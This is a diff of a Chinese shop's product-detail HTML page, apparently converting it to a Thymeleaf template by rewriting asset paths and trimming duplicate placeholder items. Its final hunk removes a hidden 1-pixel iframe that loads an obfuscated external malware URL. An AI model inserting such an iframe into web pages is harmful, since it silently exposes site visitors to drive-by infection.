@@ -1,15 +1,16 @@
 <!DOCTYPE HTML>
-<html>
+<html xmlns="http://www.w3.org/1999/xhtml"
+      xmlns:th="http://www.thymeleaf.org">
 <head>
     <meta charset="utf-8" />
     <title>无标题文档</title>
-    <link href="style/public.css" rel="stylesheet" type="text/css" />
-    <link href="style/detail.css" rel="stylesheet" type="text/css" />
-    <link href="style/you_like.css" rel="stylesheet" type="text/css" />
-    <link href="style/jqzoom.css" rel="stylesheet" type="text/css" />
-    <script type="text/javascript" src="script/jquery-1.3.2.min.js"></script>
-    <script type="text/javascript" src="script/html5.js"></script>
-    <script type="text/javascript" src="script/jqzoom.js"></script>
+    <link th:href="@{../../static/css/public.css}" rel="stylesheet" type="text/css" />
+    <link th:href="@{../../static/css/detail.css}" rel="stylesheet" type="text/css" />
+    <link th:href="@{../../static/css/you_like.css}" rel="stylesheet" type="text/css" />
+    <link th:href="@{../../static/css/jqzoom.css}" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" th:src="@{../../static/js/jquery-1.3.2.min.js}"></script>
+    <script type="text/javascript" th:src="@{../../static/js/html5.js}"></script>
+    <script type="text/javascript" th:src="@{../../static/js/jqzoom.js}"></script>
 </head>
 <body>
 <!--header-->
@@ -64,7 +65,7 @@
         <div class="search">
             <div class="search-area">
                 <input type="text" placeholder="请输入搜索关键字" class="search-input-text" />
-                <input type="button" title="搜索" class="search-input-submit">
+                <input type="button" title="搜索" class="search-input-submit" />
                 <div class="search-suggest" style="display:none;">
                     <ol>
                         <li class="search-suggest-key">三星<b>I9500</b></li>
@@ -102,17 +103,7 @@
                     <div class="cart-table">
                         <div class="cart-table-body">
                             <ul class="cart-item clearfix">
-                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg" /></a></li>
-                                <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
-                                <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
-                            </ul>
-                            <ul class="cart-item clearfix">
-                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg"></a></li>
-                                <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
-                                <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
-                            </ul>
-                            <ul class="cart-item clearfix">
-                                <li class="item-img"><a href="#"><img src="picture/small_55x55.jpg"></a></li>
+                                <li class="item-img"><a href="#"><img th:src="@{../../static/picture/small_55x55.jpg}" /></a></li>
                                 <li class="item-intro"><a href="#">三星手机NNOTOS9S</a></li>
                                 <li class="item-extra"><em class="item-price">￥<span>799</span></em>x<span>2</span><p><a href="#" class="delete">删除</a></p></li>
                             </ul>
@@ -239,28 +230,28 @@
                 <!--图片展示-->
                 <div class="img-wrap">
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                     <div class="img-big">
-                        <a href="picture/img_big.jpg" ><img width="486" height="350" src="picture/img_small_486x350.jpg" /></a>
+                        <a th:href="@{../../static/picture/img_big.jpg}" ><img width="486" height="350" th:src="@{../../static/picture/img_small_486x350.jpg}" /></a>
                     </div>
                 </div>
                 <!--//图片展示-->
@@ -268,29 +259,29 @@
                 <div class="spec-lists">
                     <div class="spec-items">
                         <ul class="clearfix" id="slider">
-                            <li class="selected"><span><img src="picture/img_btn_52x52.jpg"></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
-                            <li><span><img src="picture/img_btn_52x52.jpg" /></span></li>
+                            <li class="selected"><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
+                            <li><span><img th:src="@{../../static/picture/img_btn_52x52.jpg}" /></span></li>
                         </ul>
                     </div>
                 </div>
                 <!--//图片按钮-->
                 <div class="share-sns clearfix">
                     <span>分享到：</span>
-                    <a href="#"><img src="images/shareIcon-weibo.png" /></a>
-                    <a href="#"><img src="images/shareIcon-tencent.png" /></a>
-                    <a href="#"><img src="images/shareIcon-renren.png" /></a>
-                    <a href="#"><img src="images/shareIcon-qzone.png" /></a>
-                    <a href="#"><img src="images/shareIcon-sohu.png" /></a>
-                    <a href="#"><img src="images/shareIcon-more.png" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-weibo.png}" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-tencent.png}" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-renren.png}" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-qzone.png}" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-sohu.png}" /></a>
+                    <a href="#"><img th:src="@{../../static/images/shareIcon-more.png}" /></a>
                 </div>
             </div>
-            <script type="text/javascript" src="script/jquery.bxSlider.min.js"></script>
+            <script type="text/javascript" th:src="@{../../static/js/jquery.bxSlider.min.js}"></script>
             <script type="text/javascript">
                 $(function(){
                     $(".img-wrap .img-big").eq(0).show().siblings().hide();
@@ -390,7 +381,7 @@
                     <dd class="fl-l">
             <span class="tb_stock">
               <a href="#" class="tb_reduce">-</a>
-		      <input type="text" value="1" id="buynum">
+		      <input type="text" value="1" id="buynum" />
 			  <a href="#" class="tb_increase">+</a>
             </span>
                     </dd>
@@ -410,42 +401,14 @@
             <h3>猜你喜欢</h3>
             <ul class="you-like-list">
                 <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-img"><a href="#"><img th:src="@{../../static/picture/small_110x110.jpg}" /></a></p>
                     <p class="item-info">
                         <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
                     </p>
                     <p class="item-price">￥<em>2398</em></p>
                 </li>
                 <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                    <p class="item-info">
-                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
-                    </p>
-                    <p class="item-price">￥<em>2398</em></p>
-                </li>
-                <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                    <p class="item-info">
-                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
-                    </p>
-                    <p class="item-price">￥<em>2398</em></p>
-                </li>
-                <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                    <p class="item-info">
-                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
-                    </p>
-                    <p class="item-price">￥<em>2398</em></p>
-                </li>
-                <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                    <p class="item-info">
-                        <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
-                    </p>
-                    <p class="item-price">￥<em>2398</em></p>
-                </li>
-                <li class="you-like-item">
-                    <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                    <p class="item-img"><a href="#"><img th:src="@{../../static/picture/small_110x110.jpg}" /></a></p>
                     <p class="item-info">
                         <a href="#">苹果（APPLE）iPhone 4S 8G版 3G手机（白色）WCDMA/GSM</a>
                     </p>
@@ -466,22 +429,7 @@
                     <div class="bundle-list">
                         <ul id="bundleSlider">
                             <li class="bundle-item">
-                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
-                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
-                            </li>
-                            <li class="bundle-item">
-                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
-                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
-                            </li>
-                            <li class="bundle-item">
-                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
-                                <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
-                                <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
-                            </li>
-                            <li class="bundle-item">
-                                <p class="item-img"><a href="#"><img src="picture/small_110x110.jpg" /></a></p>
+                                <p class="item-img"><a href="#"><img th:src="@{../../static/picture/small_110x110.jpg}" /></a></p>
                                 <p class="item-info"><a href="#">苹果（APPLE）iPhone 5s 16G版 3G</a></p>
                                 <p class="item-price"><input type="checkbox" />￥<em>4898</em></p>
                             </li>
@@ -494,7 +442,7 @@
                     </div>
                 </div>
             </div>
-            <script type="text/javascript" src="script/jquery.bxSlider.min.js"></script>
+            <script type="text/javascript" th:src="@{../../static/js/jquery.bxSlider.min.js}"></script>
             <script type="text/javascript">
                 $(document).ready(function(){
                     $('#bundleSlider').bxSlider({
@@ -520,7 +468,7 @@
                     <li>常见问题</li>
                 </ul>
                 <div class="tab detail-main">
-                    <img src="picture/detail.jpg" />
+                    <img th:src="@{../../static/picture/detail.jpg}" />
                 </div><!--//商品详情-->
                 <div class="tab detail-main">
                     <h4>规格参数</h4>
@@ -666,6 +614,6 @@
     <!--//copyright-->
 </footer>
 <!--//footer-->
-<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+
 </body>
 </html>
